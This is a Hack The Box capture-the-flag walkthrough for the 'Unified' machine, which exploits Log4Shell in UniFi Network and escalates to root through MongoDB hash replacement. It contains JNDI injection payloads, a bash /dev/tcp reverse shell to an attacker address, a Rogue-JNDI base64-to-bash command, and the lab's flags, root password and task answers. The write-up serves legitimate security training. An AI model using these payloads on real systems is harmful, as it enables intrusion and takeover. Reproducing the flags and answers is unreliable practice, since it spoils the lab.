# 📘 Hack The Box: Unified

> 🔗 https://app.hackthebox.com/machines/Unified

---

# 🎯 Goal

Gain initial access by exploiting the **Log4Shell (CVE-2021-44228)** vulnerability in the UniFi Network application and escalate privileges to `root`.

---

# 📑 Table of Contents

- [🧠 Core Idea](#core-idea)
- [🧩 Theory: What is Log4Shell](#theory-what-is-log4shell)
- [🧩 Theory: What is JNDI](#theory-what-is-jndi)
- [🔍 Step 1 — Enumeration](#step-1--enumeration)
- [🌐 Step 2 — Web Application Analysis](#step-2--web-application-analysis)
- [🧪 Step 3 — Verify Log4Shell](#step-3--verify-log4shell)
- [☕ Step 4 — Rogue-JNDI](#step-4--rogue-jndi)
- [🐚 Step 5 — Reverse Shell](#step-5--reverse-shell)
- [⬆️ Step 6 — Privilege Escalation](#step-6--privilege-escalation)
- [👑 Step 7 — Root Access](#step-7--root-access)
- [📋 HTB Task Answers](#htb-task-answers)
- [🧠 Final Attack Chain](#final-attack-chain)

---

# 🧠Core Idea

This machine teaches:

- service enumeration;
- web application analysis;
- BurpSuite usage;
- Log4Shell exploitation;
- JNDI / LDAP concepts;
- reverse shells;
- MongoDB interaction;
- password hash replacement;
- privilege escalation.

Main concept:

> A vulnerable Java application performs a JNDI lookup, allowing remote code execution.

---

# 🧩Theory: What is Log4Shell

Log4Shell is a critical vulnerability in the Log4j logging library.

A malicious payload such as:

```text
${jndi:ldap://ATTACKER_IP/payload}
```

can force the application to contact an attacker-controlled LDAP server.

This may lead to:

- Remote Code Execution;
- reverse shell access;
- full system compromise.

---

# 🧩Theory: What is JNDI

JNDI stands for:

```text
Java Naming and Directory Interface
```

It is used by Java applications to locate external resources.

JNDI may leverage:

- LDAP
- RMI
- DNS

In this machine, LDAP is used.

---

# 🔍Step 1 — Enumeration

## Scan the target

```bash
export IP=10.129.145.66
nmap -sC -sV -v -oN nmap_initial.txt $IP
```

---

# Why this command matters

### `-sC`

Runs default NSE scripts.

### `-sV`

Detects service versions.

### `-v`

Verbose output.

### `-oN`

Saves scan results.

---

# Scan result

```text
22/tcp   open  ssh
8080/tcp open  http
8443/tcp open  ssl/http
6789/tcp open  ibm-db2-admin?
```

Most important service:

```text
8443/tcp
```

Running:

```text
UniFi Network
```

---

# Pentester logic after nmap

Questions to ask:

1. What version is running?
2. Are there public CVEs?
3. Is RCE possible?
4. Is the application Java-based?

---

# Step 2 — Web Application Analysis

Open:

```text
https://10.129.145.66:8443
```

The application is:

```text
UniFi Network
```

This is important because vulnerable UniFi versions were heavily affected by Log4Shell.

---

<a name="burpsuite"></a>
# 🛠️BurpSuite

## Why use BurpSuite

BurpSuite acts as a proxy between:

- browser
- target server

It allows:

- intercepting requests;
- modifying traffic;
- replaying requests;
- testing payloads.

---

# Open Burp Browser

```text
Proxy → Open Browser
```

Using Burp Browser is convenient because:

- HTTPS already works;
- certificates are trusted;
- interception works immediately.

---

# Intercept login request

Enable:

```text
Proxy → Intercept → ON
```

Use test credentials:

```text
test:test
```

Burp intercepts:

```http
POST /api/login
```

---

# Send request to Repeater

```text
CTRL + R
```

Repeater allows:

- replaying requests;
- modifying payloads;
- testing exploit chains.

---

# Step 3 — Verify Log4Shell

## Start tcpdump

```bash
sudo tcpdump -i tun0 port 389
```

---

# Why tcpdump

`tcpdump` captures network traffic.

### `-i tun0`

Listen on the HTB VPN interface.

### `port 389`

Capture LDAP traffic.

---

# Inject payload

Modify JSON:

```json
"remember":"${jndi:ldap://10.10.17.101/test}"
```

---

# Why the remember parameter

The application logs this field.

If Log4j processes it, the payload executes.

---

# Server response

```text
api.err.InvalidPayload
```

This is expected.

The important part is the LDAP callback.

---

# Vulnerability confirmation

tcpdump shows:

```text
10.129.145.66 -> 10.10.17.101:389
```

This confirms:

- payload execution;
- JNDI lookup;
- vulnerable application.

---

# Step 4 — Rogue-JNDI

## Install Java and Maven

```bash
sudo apt install openjdk-11-jdk maven -y
```

---

# What is Maven

Maven is a Java build tool.

It is used to compile Rogue-JNDI.

---

# Clone Rogue-JNDI

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

---

# What mvn package does

Builds the Java project and generates:

```text
RogueJndi-1.1.jar
```

---

# Step 5 — Reverse Shell

## Create payload

```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.17.101/4444 0>&1' | base64 -w 0
```

---

# Why Base64

Base64 helps:

- avoid parsing problems;
- safely transport shell payloads;
- reduce formatting issues.

---

# Launch Rogue-JNDI

```bash
java -jar target/RogueJndi-1.1.jar \
--command "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}" \
--hostname "10.10.17.101"
```

---

# Netcat listener

```bash
nc -lvnp 4444
```

---

# Final exploit payload

```json
"remember":"${jndi:ldap://10.10.17.101:1389/o=tomcat}"
```

---

# Reverse shell obtained

```text
connect to [10.10.17.101] from [10.129.145.66]
```

---

# Verify access

```bash
whoami
id
```

Result:

```text
unifi
uid=999(unifi)
```

---

# Upgrade shell

```bash
script /dev/null -c bash
```

---

# User flag

```bash
cd /home/michael
cat user.txt
```

---

## 🔐User Flag

<details>
<summary>Show user flag</summary>

6ced1a6a89e666c0620cdb10262ba127

</details>

---

# Step 6 — Privilege Escalation

## Check MongoDB

```bash
ps aux | grep mongo
```

MongoDB listens on:

```text
127.0.0.1:27117
```

---

# Why MongoDB matters

UniFi stores users inside MongoDB.

If we can modify hashes, we can reset administrator credentials.

---

# Connect to MongoDB

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

---

# What ace means

`ace` is the default UniFi database.

---

# Enumerate users

```text
db.admin.find()
```

---

# Generate SHA-512 hash

```bash
openssl passwd -6 Password1234
```

---

# Replace admin hash

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"NEW_HASH"}})'
```

---

# What update() does

```text
db.admin.update()
```

updates user data inside MongoDB.

---

# Login to UniFi

```text
administrator
Password1234
```

---

# Retrieve SSH credentials

Navigate to:

```text
Settings → Site → SSH Authentication
```

---

## 🔐Root Password

<details>
<summary>Show password</summary>

NotACrackablePassword4U2022

</details>

---

# Step 7 — Root Access

```bash
ssh root@10.129.145.66
```

---

# Root flag

```bash
cat /root/root.txt
```

---

## 🔐Root Flag

<details>
<summary>Show root flag</summary>

e50bc93c75b634e4b272d2f771c33681

</details>

---

# 📋HTB Task Answers

<details>
<summary>Show answers</summary>

1. ldap
2. tcpdump
3. 389
4. 27117
5. ace
6. db.admin.find()
7. db.admin.update()
8. NotACrackablePassword4U2022

</details>

---

# 🧠Final Attack Chain

```text
nmap
→ UniFi
→ Log4Shell
→ JNDI LDAP callback
→ Rogue-JNDI
→ reverse shell
→ MongoDB enumeration
→ password hash replacement
→ UniFi admin access
→ SSH credential disclosure
→ root SSH
```

---

<a name="what-this-machine-teaches"></a>
# 📚What this machine teaches [⬆️ Back to TOC](#-table-of-contents)

Unified is an excellent beginner/intermediate machine for understanding:

- Log4Shell;
- JNDI exploitation;
- LDAP callbacks;
- reverse shells;
- MongoDB;
- password hash replacement;
- attack-chain thinking.

Main lesson:

> A single logging vulnerability may lead to full infrastructure compromise.
